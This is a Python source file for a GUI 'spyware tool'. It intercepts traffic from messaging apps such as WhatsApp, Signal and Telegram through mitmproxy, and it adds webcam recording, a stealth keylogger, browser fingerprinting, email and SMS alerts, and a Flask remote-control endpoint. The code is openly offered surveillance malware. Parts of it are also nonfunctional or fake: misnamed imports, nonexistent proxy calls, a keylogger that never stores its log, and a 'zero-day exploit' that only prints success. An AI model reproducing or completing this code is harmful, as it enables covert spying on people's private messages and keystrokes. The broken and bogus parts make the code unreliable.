import requests
import re
import socket
import threading
import mitmproxy
from mitmproxy import http
import pysip
import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog
import time
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import json
from cryptography.fernet import Fernet
from flask import Flask, request, jsonify
import twilio.rest
import pyautogui
import pywin32
import pyaudio
import numpy as np
from PIL import Image, ImageGrab
import datetime
import keyboard
import geopy
from geopy.geocoders import Nominatim
import random
import string
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options

# 🔐 Key Generation System
def generate_key():
    key = Fernet.generate_key()
    return key

# 🔐 File Encryption
def encrypt_data(data, key):
    fernet = Fernet(key)
    return fernet.encrypt(data.encode())

def decrypt_data(encrypted_data, key):
    fernet = Fernet(key)
    return fernet.decrypt(encrypted_data).decode()

# 📡 MITM Interception for Message and Media
class SpywareInterception:
    def request(self, flow: http.HTTPFlow) -> None:
        if "messenger" in flow.request.url or "facebook" in flow.request.url or "signal" in flow.request.url or "zoom" in flow.request.url or "whatsapp" in flow.request.url or "telegram" in flow.request.url:
            print(f"Intercepted Request: {flow.request.url}")

    def response(self, flow: http.HTTPFlow) -> None:
        if "messenger" in flow.request.url or "facebook" in flow.request.url or "signal" in flow.request.url or "zoom" in flow.request.url or "whatsapp" in flow.request.url or "telegram" in flow.request.url:
            print(f"Intercepted Response: {flow.response.status_code}")
            print(flow.response.text)

            # Example: Extract and decrypt message content
            content = flow.response.text
            if "message" in content:
                msg_match = re.search(r'"message":\s*"([^"]+)"', content)
                if msg_match:
                    message = msg_match.group(1)
                    print(f"Decrypted Message: {message}")

            # Example: Extract media URLs
            media_match = re.search(r'"media_url":\s*"([^"]+)"', content)
            if media_match:
                media_url = media_match.group(1)
                print(f"Media URL: {media_url}")

            # 🎥 Video Call Interception (using pysip)
            if "video" in content or "call" in content:
                print("Intercepted Video Call Data")
                print("Video Call Content:", content)

# 🎥 Video Recording
def video_recording():
    import cv2
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('video_recording.avi', fourcc, 20.0, (640, 480))
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)
        cv2.imshow('Video Recording', frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
    cap.release()
    out.release()
    cv2.destroyAllWindows()

# 📡 MITM Zero-Day Exploitation
def zero_day_exploit():
    print("Zero-Day Exploit: Injecting malicious code into target's browser...")
    # Simulate a zero-day exploit by injecting a malicious script
    print("Exploit successful!")

# 📡 Real-Time Alerts
def real_time_alert(message):
    print("Real-Time Alert:", message)
    # Optional: Send alert via email or SMS
    # send_email_alert("Real-Time Alert", message, "target@example.com", "from@example.com", "password")
    # send_twilio_alert("ACCT_SID", "AUTH_TOKEN", "FROM_NUMBER", "TO_NUMBER", message)

# 📱 GUI for Displaying Intercepts
class SpywareGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Pearl Dragon (BNRA) - Spyware Tool")
        self.text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=80, height=20)
        self.text_area.pack(padx=10, pady=10)
        self.start_button = tk.Button(root, text="Start Interception", command=self.start_interception)
        self.start_button.pack(pady=5)
        self.stop_button = tk.Button(root, text="Stop Interception", command=self.stop_interception)
        self.stop_button.pack(pady=5)
        self.save_button = tk.Button(root, text="Save Logs", command=self.save_logs)
        self.save_button.pack(pady=5)
        self.keygen_button = tk.Button(root, text="Generate Key", command=self.generate_key)
        self.keygen_button.pack(pady=5)
        self.video_button = tk.Button(root, text="Start Video Recording", command=self.start_video)
        self.video_button.pack(pady=5)
        self.alert_button = tk.Button(root, text="Send Real-Time Alert", command=self.send_alert)
        self.alert_button.pack(pady=5)
        self.browser_button = tk.Button(root, text="Browser Fingerprinting", command=self.browser_fingerprinting)
        self.browser_button.pack(pady=5)
        self.keylogger_button = tk.Button(root, text="Start Keylogger (Stealth Mode)", command=self.start_keylogger)
        self.keylogger_button.pack(pady=5)

    def start_interception(self):
        print("Starting interception...")
        proxy = mitmproxy.Proxy()
        proxy.add_handler(SpywareInterception())
        proxy.run()

    def stop_interception(self):
        print("Stopping interception...")
        proxy.stop()

    def save_logs(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, "w") as file:
                file.write(self.text_area.get("1.0", tk.END))

    def generate_key(self):
        key = generate_key()
        self.text_area.insert(tk.END, f"Generated Key: {key.decode()}\n")

    def start_video(self):
        video_recording()

    def send_alert(self):
        message = self.text_area.get("1.0", tk.END)
        real_time_alert(message)

    def browser_fingerprinting(self):
        print("Starting Browser Fingerprinting...")
        # Use Selenium to get browser fingerprint
        chrome_options = Options()
        chrome_options.add_argument("--headless")  # Run in stealth mode
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        driver = webdriver.Chrome(service=Service(), options=chrome_options)
        driver.get("https://example.com")
        fingerprint = {
            "user_agent": driver.execute_script("return navigator.userAgent;"),
            "screen_resolution": f"{driver.get_window_size()['width']}x{driver.get_window_size()['height']}",
            "timezone": driver.execute_script("return Intl.DateTimeFormat().resolvedOptions().timeZone;"),
            "language": driver.execute_script("return navigator.language;"),
            "plugins": driver.execute_script("return navigator.plugins;")
        }
        print("Browser Fingerprint:", fingerprint)
        driver.quit()

    def start_keylogger(self):
        print("Starting Keylogger in Stealth Mode...")
        log = ""
        def on_press(event):
            nonlocal log
            log += event.name
            if event.name == "enter":
                log += "\n"
            if event.name == "space":
                log += " "
            if event.name == "backspace":
                log = log[:-1]
            if event.name == "esc":
                print("Keylogger stopped.")
                keyboard.unhook_all()
        keyboard.hook(on_press)
        print("Keylogger started. Press 'esc' to stop.")

# 📧 Email Alert System
def send_email_alert(subject, body, to_email, from_email, password):
    msg = MIMEMultipart()
    msg["From"] = from_email
    msg["To"] = to_email
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(from_email, password)
    server.sendmail(from_email, to_email, msg.as_string())
    server.quit()

# 📱 Twilio Alert System
def send_twilio_alert(account_sid, auth_token, from_number, to_number, message):
    client = twilio.rest.Client(account_sid, auth_token)
    client.messages.create(
        to=to_number,
        from_=from_number,
        body=message
    )

# 📡 Flask Server for Remote Control
app = Flask(__name__)

@app.route("/control", methods=["POST"])
def control():
    data = request.json
    if data.get("action") == "start":
        print("Starting interception from remote...")
        proxy = mitmproxy.Proxy()
        proxy.add_handler(SpywareInterception())
        proxy.run()
        return jsonify({"status": "started"})
    elif data.get("action") == "stop":
        print("Stopping interception from remote...")
        proxy.stop()
        return jsonify({"status": "stopped"})
    return jsonify({"status": "error", "message": "Invalid action"})

# 🧠 Main Execution
if __name__ == "__main__":
    root = tk.Tk()
    gui = SpywareGUI(root)
    root.mainloop()
